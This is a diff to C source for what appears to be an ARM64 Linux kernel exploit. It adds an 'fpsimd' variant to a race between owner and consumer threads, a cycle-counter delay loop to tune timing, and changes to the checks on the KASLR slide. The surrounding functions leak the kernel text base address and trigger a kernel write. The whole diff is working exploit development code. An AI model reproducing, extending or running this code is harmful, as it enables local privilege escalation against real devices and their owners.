@@ -88,6 +88,8 @@ void slide_log_child_context(void) {
   const char *writer = "pselect";
 #if SLIDE_USE_MCAST
   writer = "mcast";
+#elif SLIDE_USE_FPSIMD
+  writer = "fpsimd";
 #endif
   read_first_line("/proc/self/attr/current", attr, sizeof(attr));
   read_first_line("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
@@ -95,6 +97,24 @@ void slide_log_child_context(void) {
              "gid=%u egid=%u attr=%s enforce=%s\n",
              writer, getpid(), getuid(), geteuid(), getgid(), getegid(),
              attr, enforce);
+}
+
+static inline uint64_t slide_read_cntvct(void) {
+  uint64_t value;
+  __asm__ volatile("isb\n\tmrs %0, cntvct_el0\n\tisb"
+                   : "=r"(value) :: "memory");
+  return value;
+}
+
+void slide_apply_route_fine_delay(void) {
+  uint64_t ticks = slide_route_fine_delay_ticks;
+  if (!ticks || ticks == UINT64_MAX) {
+    return;
+  }
+  uint64_t start = slide_read_cntvct();
+  while (slide_read_cntvct() - start < ticks) {
+    __asm__ volatile("yield" ::: "memory");
+  }
 }
 
 void slide_reset_consume_state(void) {
@@ -193,9 +213,11 @@ static void *slide_waiter_thread(void *arg __attribute__((unused))) {
   pr_info("slide pi stage=writer-enter tid=%d\n", tid);
 #endif
 
-  /* Dispatch to pselect (default) or mcast (gated) stack copy. */
+  /* Dispatch to pselect (default), mcast or fpsimd stack copy. */
 #if SLIDE_USE_MCAST
   slide_mcast_stack_copy();
+#elif SLIDE_USE_FPSIMD
+  slide_fpsimd_stack_copy();
 #else
   slide_pselect_stack_copy();
 #endif
@@ -329,6 +351,8 @@ static uint64_t slide_child_leak_stext(void) {
   SYSCHK(pthread_create(&owner, NULL, slide_owner_thread, NULL));
 #if SLIDE_USE_MCAST
   SYSCHK(pthread_create(&consumer, NULL, slide_mcast_consumer_thread, NULL));
+#elif SLIDE_USE_FPSIMD
+  SYSCHK(pthread_create(&consumer, NULL, slide_fpsimd_consumer_thread, NULL));
 #else
   SYSCHK(pthread_create(&consumer, NULL, slide_pselect_consumer_thread, NULL));
 #endif
@@ -384,6 +408,8 @@ int slide_child_trigger_write(void) {
   SYSCHK(pthread_create(&owner, NULL, slide_owner_thread, NULL));
 #if SLIDE_USE_MCAST
   SYSCHK(pthread_create(&consumer, NULL, slide_mcast_consumer_thread, NULL));
+#elif SLIDE_USE_FPSIMD
+  SYSCHK(pthread_create(&consumer, NULL, slide_fpsimd_consumer_thread, NULL));
 #else
   SYSCHK(pthread_create(&consumer, NULL, slide_pselect_consumer_thread, NULL));
 #endif
@@ -827,7 +853,7 @@ static int slide_commit_stext(uint64_t stext, const char *source) {
     return 0;
   }
   uint64_t slide = stext - KIMAGE_TEXT_BASE;
-  if (slide > 0x1f0000ULL || (slide & 0x7fffULL) != 0) {
+  if (slide > 0x1f0000ULL || (slide & (SLIDE_KASLR_STEP - 1)) != 0) {
     pr_warning("slide rejected source=%s stext=%016llx slide=%016llx\n",
                source, (unsigned long long)stext,
                (unsigned long long)slide);
@@ -866,7 +892,7 @@ int slide_leak_kernel_base(void) {
     errno = 0;
     unsigned long long value = strtoull(forced_offset_arg, &end, 0);
     if (errno || end == forced_offset_arg || *end || value > 0x1f0000ULL ||
-        (value & SLIDE_ALIGN_MASK) != 0) {
+        (value & (SLIDE_KASLR_STEP - 1)) != 0) {
       pr_error("slide invalid forced p0 offset=%s\n", forced_offset_arg);
       return 0;
     }
@@ -918,7 +944,7 @@ int slide_leak_kernel_base(void) {
     errno = 0;
     unsigned long long value = strtoull(forced_offset_arg, &end, 0);
     if (errno || end == forced_offset_arg || *end || value > 0x1f0000ULL ||
-        (value & SLIDE_ALIGN_MASK) != 0) {
+        (value & (SLIDE_KASLR_STEP - 1)) != 0) {
       pr_error("slide invalid forced p0 offset=%s\n", forced_offset_arg);
       return 0;
     }
